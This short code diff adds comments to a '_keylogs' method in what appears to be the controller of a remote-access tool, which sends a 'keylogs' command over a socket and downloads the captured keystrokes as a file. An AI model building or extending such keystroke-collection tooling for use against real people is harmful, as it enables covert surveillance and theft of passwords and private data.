@@ -91,8 +91,11 @@ class Client:
         print(response)
 
     def _keylogs(self) -> None:
+        # send instuction to client to request keylogs
         self._send("keylogs")
+        # receive receive the size of the keylog data
         file_size = self._sock.recv(1024).decode("utf-8")
+        # receive the keylog data
         self._recieve_file(int(file_size), file_name=f"keylogs.txt")
 
     def _download(self, file_path: str) -> None:
